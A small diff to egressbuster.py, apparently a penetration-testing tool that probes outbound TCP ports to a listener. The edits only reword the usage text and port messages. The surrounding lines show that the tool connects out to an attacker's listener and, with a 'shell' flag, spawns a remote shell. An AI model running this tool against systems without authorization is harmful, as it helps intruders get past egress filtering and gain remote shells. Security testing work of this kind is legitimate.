@@ -43,12 +43,10 @@ A TrustedSec Project
 
 NOTE: Supports all 65536 TCP ports.
 
-Usage:
+Usage: $ egressbuster.py <listener_ip_address> <lowport-highport> (optional_flag_shell)
 
-Note that the last option is optional. If you want a shell to spawn when a port
-is detected, simply type shell as an optional flag.
-
-Usage: $ egressbuster.py <listener_ip_address> <lowport-highport> <optional_flag_shell>
+Note that the last flag is optional. If you want a shell to spawn when a port
+is detected, simply type 'shell' as the optional flag.
 
 Example: $ egressbuster.py 10.9.5.2 1-65536 shell
         """
@@ -71,7 +69,7 @@ def start_socket(ipaddr, base_port, shell):
         sockobj.connect((ipaddr, base_port))
         sockobj.send(str(base_port))
         sockobj.send('')
-        print "[*] Connection made to %s on port: TCP %s" % (ipaddr, base_port)
+        print "[*] Connection made to %s on port: %s/tcp" % (ipaddr, base_port)
         if shell == "shell":
             # start loop
             while 1:
@@ -111,7 +109,7 @@ def start_socket(ipaddr, base_port, shell):
     except timeout:
         sockobj.close()
         if verbose:
-            print "[v] Can't use port: TCP %s" % base_port
+            print "[v] Can't use port: %s/tcp" % base_port
 
 #    except Exception,e :
 #		print e
@@ -150,7 +148,7 @@ if end_port > 65536:
     end_port = 65536
 
 print "[i] Sending packets to egress listener (%s)..." % ipaddr
-print "[i] Starting at: TCP %s, ending at: TCP %s" % (base_port, end_port)
+print "[i] Starting at: %s/tcp, ending at: %s/tcp" % (base_port, end_port)
 
 while base_port <= end_port:
     thread.start_new_thread(start_socket, (ipaddr, base_port, shell))
